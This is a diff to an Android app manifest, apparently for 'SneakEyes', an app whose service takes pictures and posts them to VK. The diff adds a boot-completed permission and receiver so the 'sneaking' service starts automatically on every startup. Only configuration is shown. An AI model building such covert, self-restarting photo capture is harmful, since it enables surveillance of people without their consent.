@@ -18,6 +18,10 @@
     <!--Needed to check network status-->
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
 
+    <!--Permission to receive broadcast intent notifying of system startup.
+        Needed by broadcast receiver to activate sneaking service on startup-->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+
     <application
         android:name=".SneakEyesApp"
         android:allowBackup="true"
@@ -47,6 +51,13 @@
 
         <!-- Service takes pictures and posts to VK -->
         <service android:name=".SneakingService"/>
+
+        <!--Broadcast receiver activates sneaking polling service on system startup-->
+        <receiver android:name=".StartupReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
 
     </application>
 
